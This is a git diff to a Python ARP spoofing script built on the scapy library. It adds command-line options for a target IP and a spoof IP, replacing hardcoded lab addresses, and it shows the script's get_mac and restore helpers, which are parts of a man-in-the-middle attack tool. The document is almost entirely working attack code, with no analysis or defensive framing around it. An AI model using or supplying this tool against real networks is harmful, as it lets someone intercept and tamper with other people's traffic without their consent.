@@ -2,7 +2,20 @@
 
 import scapy.all as scapy
 import time
+import argparse
 
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest="target", help="Target IP to spoof.")
+    parser.add_argument("-s", "--spoof", dest="spoof", help="Spoof target with this IP.")
+    options = parser.parse_args()
+    if not options.target:
+        parser.error("[-] Please specify an IP of target")
+    elif not options.spoof:
+        parser.error("[-] Please specify an IP to spoof")
+    return options
+    
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -25,8 +38,9 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
-target_ip = "10.0.2.7"
-gateway_ip = "10.0.2.1"
+options = get_arguments()
+target_ip = options.target
+gateway_ip = options.spoof
 
 sent_packets_count = 0
 try:
